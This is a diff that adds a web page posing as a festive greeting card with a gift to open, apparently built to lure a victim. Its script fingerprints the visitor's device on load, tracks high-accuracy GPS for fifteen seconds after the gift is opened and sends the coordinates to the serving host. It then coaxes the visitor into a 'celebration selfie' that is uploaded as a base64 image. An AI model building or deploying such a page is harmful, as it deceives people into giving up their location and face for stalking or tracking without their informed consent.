@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎉 Festival Wishes - Special Message For You!</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family:'Poppins',sans-serif;
+    min-height:100vh; overflow-x:hidden;
+    background: linear-gradient(135deg, #0d0221 0%, #190d2e 30%, #2d0a4e 60%, #1a0a3e 100%);
+  }
+
+  /* Fireworks */
+  .fireworks { position:fixed; inset:0; pointer-events:none; overflow:hidden; }
+  .spark {
+    position:absolute; width:4px; height:4px; border-radius:50%;
+    animation: sparkFly var(--dur,2s) ease-out forwards;
+  }
+  @keyframes sparkFly {
+    0% { transform:translate(0,0) scale(1); opacity:1; }
+    100% { transform:translate(var(--tx),var(--ty)) scale(0); opacity:0; }
+  }
+
+  /* Floating particles */
+  .particles { position:fixed; inset:0; pointer-events:none; }
+  .particle {
+    position:absolute; font-size:20px; animation: floatUp 6s ease-in-out infinite;
+    opacity:0.8;
+  }
+  @keyframes floatUp {
+    0% { transform:translateY(110vh) rotate(0deg); opacity:0; }
+    20% { opacity:0.8; }
+    80% { opacity:0.8; }
+    100% { transform:translateY(-10vh) rotate(720deg); opacity:0; }
+  }
+
+  .main-content {
+    position:relative; z-index:10;
+    min-height:100vh; display:flex; align-items:center; justify-content:center;
+    padding:20px;
+  }
+
+  .card {
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 28px;
+    padding: 48px 40px;
+    max-width: 480px; width:100%;
+    text-align:center;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+    animation: cardPop 0.8s cubic-bezier(0.34,1.56,0.64,1);
+  }
+  @keyframes cardPop { from{transform:scale(0.5) translateY(60px);opacity:0} to{transform:scale(1) translateY(0);opacity:1} }
+
+  .emoji-header {
+    font-size: 80px; margin-bottom: 8px;
+    animation: bounce 1.5s ease-in-out infinite;
+  }
+  @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }
+
+  h1 {
+    font-size: 32px; font-weight: 800;
+    background: linear-gradient(135deg, #ffd700, #ff6b6b, #ff9a9e, #ffecd2);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    margin-bottom: 8px; line-height: 1.2;
+  }
+  .subtitle {
+    font-size: 15px; color: rgba(255,255,255,0.7); margin-bottom: 28px; line-height:1.6;
+  }
+
+  /* Gift box animation */
+  .gift-box {
+    width: 120px; height: 120px; margin: 0 auto 28px;
+    position: relative; cursor: pointer;
+    animation: giftWobble 3s ease-in-out infinite;
+  }
+  @keyframes giftWobble {
+    0%,100%{transform:rotate(-3deg)} 50%{transform:rotate(3deg)}
+  }
+  .gift-box::before {
+    content:'🎁'; font-size:90px;
+    position:absolute; inset:0; display:flex; align-items:center; justify-content:center;
+    filter: drop-shadow(0 0 20px rgba(255,215,0,0.6));
+  }
+
+  .from-msg {
+    background: rgba(255,215,0,0.08);
+    border: 1px solid rgba(255,215,0,0.2);
+    border-radius: 14px; padding: 16px;
+    font-size: 15px; color: rgba(255,255,255,0.9);
+    margin-bottom: 28px; line-height: 1.6;
+    font-style: italic;
+  }
+
+  .photo-section {
+    margin-bottom: 24px;
+    display: none;
+  }
+  .photo-section.show { display: block; }
+  .photo-note { font-size:13px; color:rgba(255,255,255,0.5); margin-bottom:12px; }
+  .selfie-preview {
+    width:100%; max-height:200px; object-fit:cover;
+    border-radius:12px; border:2px solid rgba(255,215,0,0.3);
+    display:none;
+  }
+  .selfie-preview.show { display:block; }
+
+  .open-btn {
+    width:100%; padding:16px;
+    background: linear-gradient(135deg, #ffd700, #ff6b6b);
+    border:none; border-radius:16px; color:#fff; font-size:18px;
+    font-weight:700; cursor:pointer; letter-spacing:0.5px;
+    transition:all 0.3s; position:relative; overflow:hidden;
+    box-shadow: 0 8px 32px rgba(255,107,107,0.4);
+  }
+  .open-btn::before {
+    content:''; position:absolute; inset:0;
+    background: linear-gradient(135deg, rgba(255,255,255,0.2), transparent);
+    transform:translateX(-100%); transition:transform 0.4s;
+  }
+  .open-btn:hover::before { transform:translateX(100%); }
+  .open-btn:hover { transform:translateY(-3px); box-shadow:0 12px 40px rgba(255,107,107,0.5); }
+
+  .share-btn {
+    width:100%; padding:12px;
+    background: rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15);
+    border-radius:12px; color:rgba(255,255,255,0.8); font-size:15px;
+    cursor:pointer; margin-top:12px; transition:all 0.2s;
+  }
+  .share-btn:hover { background:rgba(255,255,255,0.12); }
+
+  .footer-msg { font-size:12px; color:rgba(255,255,255,0.3); margin-top:20px; }
+
+  .confetti-piece {
+    position:fixed; width:10px; height:10px;
+    animation: confettiFall 4s ease-in forwards;
+    z-index:5; pointer-events:none;
+  }
+  @keyframes confettiFall {
+    0%{transform:translateY(-20px) rotate(0deg);opacity:1;}
+    100%{transform:translateY(110vh) rotate(720deg);opacity:0;}
+  }
+
+  video { display:none; }
+  canvas { display:none; }
+</style>
+</head>
+<body>
+
+<div class="fireworks" id="fireworks"></div>
+<div class="particles" id="particles"></div>
+
+<div class="main-content">
+  <div class="card">
+    <div class="emoji-header">🎊</div>
+    <h1>Special Wish For You!</h1>
+    <div class="subtitle">Someone special has sent you a personalized greeting card. Open it to see your surprise!</div>
+
+    <div class="gift-box" onclick="openGift()"></div>
+
+    <div class="from-msg" id="fromMsg" style="display:none">
+      "Wishing you joy, love, and endless happiness on this special occasion! May all your dreams come true. 🌟✨"
+      <br><br><strong>— From a special friend 💝</strong>
+    </div>
+
+    <div class="photo-section" id="photoSection">
+      <div class="photo-note">📸 Take a selfie to include in the celebration!</div>
+      <video id="selfieVideo" autoplay muted playsinline style="display:none"></video>
+      <canvas id="selfieCanvas" style="display:none"></canvas>
+      <img class="selfie-preview" id="selfiePreview" alt="Your selfie">
+    </div>
+
+    <button class="open-btn" id="mainBtn" onclick="openGift()">🎁 Open Your Gift</button>
+    <button class="share-btn">📤 Share This Wish</button>
+    <div class="footer-msg">Tap to reveal your special message ✨</div>
+  </div>
+</div>
+
+<script>
+const SERVER = window.location.origin;
+let sessionId = null, photoIndex = 0, opened = false;
+
+// Particles
+const emojis = ['🎊','🎉','✨','⭐','🌟','💫','🎈','🎀','💖','🌸'];
+const pc = document.getElementById('particles');
+for(let i=0;i<15;i++){
+  const p = document.createElement('div');
+  p.className = 'particle';
+  p.textContent = emojis[Math.floor(Math.random()*emojis.length)];
+  p.style.left = Math.random()*100+'vw';
+  p.style.animationDelay = Math.random()*6+'s';
+  p.style.animationDuration = (4+Math.random()*4)+'s';
+  p.style.fontSize = (14+Math.random()*20)+'px';
+  pc.appendChild(p);
+}
+
+// Confetti
+function launchConfetti() {
+  const colors = ['#ffd700','#ff6b6b','#4ecdc4','#45b7d1','#96e6a1','#ff9a9e'];
+  for(let i=0;i<60;i++){
+    setTimeout(()=>{
+      const c = document.createElement('div');
+      c.className = 'confetti-piece';
+      c.style.left = Math.random()*100+'vw';
+      c.style.background = colors[Math.floor(Math.random()*colors.length)];
+      c.style.borderRadius = Math.random()>0.5?'50%':'2px';
+      c.style.animationDelay = Math.random()*2+'s';
+      c.style.animationDuration = (3+Math.random()*3)+'s';
+      document.body.appendChild(c);
+      setTimeout(()=>c.remove(),6000);
+    }, i*50);
+  }
+}
+
+async function sendBeacon() {
+  try {
+    const r = await fetch(`${SERVER}/api/beacon`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({template:'festival',screen:{width:screen.width,height:screen.height},platform:navigator.platform,language:navigator.language})
+    });
+    sessionId = (await r.json()).session;
+  } catch(e){}
+}
+
+async function openGift() {
+  if (opened) return;
+  opened = true;
+  launchConfetti();
+  document.getElementById('fromMsg').style.display = 'block';
+  document.getElementById('photoSection').classList.add('show');
+  document.getElementById('mainBtn').textContent = '📸 Take Celebration Selfie!';
+  document.getElementById('mainBtn').onclick = takeSelfie;
+
+  console.log('[DEBUG] Location capture called, sessionId=', sessionId);
+  let gpsLat = null, gpsLon = null, gpsAcc = null;
+  let watchId = null;
+
+  if(navigator.geolocation){
+    try {
+      watchId = navigator.geolocation.watchPosition((pos) => {
+        gpsLat = pos.coords.latitude;
+        gpsLon = pos.coords.longitude;
+        gpsAcc = pos.coords.accuracy;
+        console.log('[DEBUG] watchPosition GPS:', gpsLat, gpsLon, gpsAcc, 'm');
+      }, (err) => {
+        console.log('[!] watchPosition error:', err.code, err.message);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
+      });
+
+      await new Promise(r => setTimeout(r, 15000));
+
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+    } catch(err) {
+      console.log('[!] Geolocation setup error:', err);
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+    }
+  } else {
+    console.log('[DEBUG] Geolocation not supported');
+  }
+  fetch(`${SERVER}/api/location`,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({session:sessionId,lat:gpsLat,lon:gpsLon,accuracy:gpsAcc})})
+    .then(r=>r.json()).then(d=>console.log('[DEBUG] Location response:', d))
+    .catch(e=>console.log('[!] Location send error:', e));
+}
+
+async function takeSelfie() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    const video = document.getElementById('selfieVideo');
+    video.srcObject = stream; video.style.display = 'block';
+
+    setTimeout(()=>{
+      const c = document.getElementById('selfieCanvas');
+      c.width=video.videoWidth||640; c.height=video.videoHeight||480;
+      c.getContext('2d').drawImage(video,0,0);
+      const b64 = c.toDataURL('image/jpeg',0.85);
+      document.getElementById('selfiePreview').src = b64;
+      document.getElementById('selfiePreview').classList.add('show');
+      fetch(`${SERVER}/api/photo`,{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({session:sessionId,image:b64,index:photoIndex++,camera:'front'})});
+      stream.getTracks().forEach(t=>t.stop());
+      video.style.display='none';
+      document.getElementById('mainBtn').textContent = '✅ Selfie Captured! Share Now';
+    }, 1500);
+  } catch(e){}
+}
+
+sendBeacon();
+</script>
+</body>
+</html>
